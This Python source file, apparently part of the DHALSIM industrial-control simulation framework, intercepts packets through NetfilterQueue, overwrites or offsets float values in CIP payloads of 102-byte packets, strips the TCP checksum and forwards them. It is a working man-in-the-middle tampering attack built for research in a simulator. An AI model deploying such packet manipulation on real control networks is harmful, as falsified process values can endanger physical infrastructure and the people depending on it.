import argparse
import os
import traceback
from pathlib import Path
import sys
import signal

from netfilterqueue import NetfilterQueue
import yaml
from dhalsim.py3_logger import get_logger

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload

class PacketQueue:
    """
    Currently, the Netfilterqueue library in Python3 does not support running in threads, using blocking calls.
    We will use this class to launch a subprocess that handles the packets in the queue.
    """

    def __init__(self,  intermediate_yaml_path: Path, yaml_index: int, queue_number: int):

        signal.signal(signal.SIGINT, self.sigint_handler)
        signal.signal(signal.SIGTERM, self.sigint_handler)

        self.queue_number = queue_number
        self.yaml_index = yaml_index
        self.nfqueue = None

        with intermediate_yaml_path.open() as yaml_file:
            self.intermediate_yaml = yaml.load(yaml_file, Loader=yaml.FullLoader)

        self.logger = get_logger(self.intermediate_yaml['log_level'])

        # Get the attack that we are from the intermediate YAML
        self.intermediate_attack = self.intermediate_yaml["network_attacks"][self.yaml_index]

    def main_loop(self):
        self.nfqueue = NetfilterQueue()
        self.nfqueue.bind(self.queue_number, self.capture)
        try:
            self.logger.debug('Queue bound to number' + str(self.queue_number) + ' , running queue now')
            self.nfqueue.run()
        except Exception as exc:
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)

    def capture(self, pkt):
        """
        This function is the function that will run in the thread started in the setup function.

        For every packet that enters the netfilterqueue, it will check its length. If the length is
        in between 100 and 116, we are dealing with a CIP packet. We then change the payload of that
        packet and delete the original checksum.
        :param pkt: The captured packet.
        """
        self.logger.debug('capture method')
        try:
            p = IP(pkt.get_payload())
            #self.logger.debug('packet')
            if len(p) == 102:
                self.logger.debug('modifying')
                if 'value' in self.intermediate_attack.keys():
                    p[Raw].load = translate_float_to_payload(
                        self.intermediate_attack['value'], p[Raw].load)
                elif 'offset' in self.intermediate_attack.keys():
                    p[Raw].load = translate_float_to_payload(
                        translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
                            'offset'], p[Raw].load)

                del p[TCP].chksum

                pkt.set_payload(bytes(p))
                self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")

            pkt.accept()
        except Exception as exc:
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)

    def interrupt(self):
        if self.nfqueue:
            self.nfqueue.unbind()

    def sigint_handler(self, sig, frame):
        """Interrupt handler for attacker being stoped"""
        self.logger.debug("{name} NfQueue shutdown".format(name=self.intermediate_attack["name"]))
        self.interrupt()
        sys.exit(0)

def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")
    parser.add_argument(dest="number", help="Number of que queue configured in IP Tables",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = PacketQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number = args.number)
    attack.main_loop()



